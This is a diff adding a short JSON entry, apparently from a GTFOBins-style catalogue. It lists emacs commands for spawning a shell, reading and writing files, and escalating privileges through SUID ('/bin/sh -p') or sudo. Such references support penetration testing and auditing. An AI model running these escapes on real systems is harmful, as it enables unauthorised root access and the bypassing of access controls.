@@ -1,0 +1,29 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "emacs -Q -nw --eval '(term \"/bin/sh\")'"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "emacs [file]\nDATA\nC-x C-s\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "emacs [file]"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
+      }
+    ]
+  }
+}
